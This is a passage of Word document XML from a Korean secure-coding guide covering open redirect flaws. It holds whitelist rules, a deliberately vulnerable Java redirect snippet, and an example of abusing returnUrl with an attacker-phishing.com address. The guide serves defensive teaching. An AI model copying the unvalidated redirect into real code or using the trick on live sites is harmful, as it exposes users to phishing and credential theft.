          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">7. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>신뢰되지</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>않는</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>자동접속</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>연결</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>(Open Redirect)</w:t>
      </w:r>
      <w:r w:rsidR="000E2F15">
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00980484">
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:r w:rsidR="00980484">
        <w:rPr>
          <w:rFonts w:ascii="바탕체" w:eastAsia="바탕체" w:hAnsi="바탕체" w:cs="바탕체" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>피싱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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>리다이렉트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허용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> URL </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>및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도메인은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화이트리스트로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관리한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자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입력값을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리다이렉트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주소로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사용할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경우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화이트리스트에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존재하는지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반드시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확인한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>그대로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>리다이렉트</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String url = request.getParameter("returnUrl");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">response.sendRedirect(url);  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>피싱</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>사이트로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>유도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">returnUrl </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파라미터에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> http://attacker-phishing.com </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>넣으면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정상</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>도메인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(bkr.kr)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>통해</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>접속한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>악성</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사이트로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>리다이렉트됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정상</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> URL</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>클릭했다고</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인식하므로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>피싱</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>성공률이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>매우</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>높으며</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로그인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정보</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>금융정보</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탈취에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>악용됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>허용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>도메인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>화이트리스트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
